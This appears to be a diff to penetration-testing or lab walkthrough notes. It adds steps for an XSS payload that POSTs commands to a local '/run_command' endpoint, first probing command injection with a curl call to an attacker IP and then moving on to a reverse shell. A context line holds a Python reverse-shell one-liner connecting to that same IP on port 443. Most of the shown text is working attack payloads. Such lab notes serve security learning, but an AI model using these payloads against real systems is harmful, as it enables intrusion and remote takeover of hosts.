@@ -85,6 +85,20 @@ import os,pty,socket;s=socket.socket();s.connect(("192.168.45.165",443));[os.dup
 ```
 
 - Create a XSS payload (xss_to_rce.js) that will trigger RCE.
+First try to run a simple curl command to see if command injection is possible
+```
+fetch('http://localhost:3000/run_command', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: "cmd=curl http://192.168.45.165:443"
+})
+```
+And you you can see the response in netcat on port 443.
+
+So try to take reverse shell.
+
 ```
 fetch('http://localhost:3000/run_command', {
     method: 'POST',
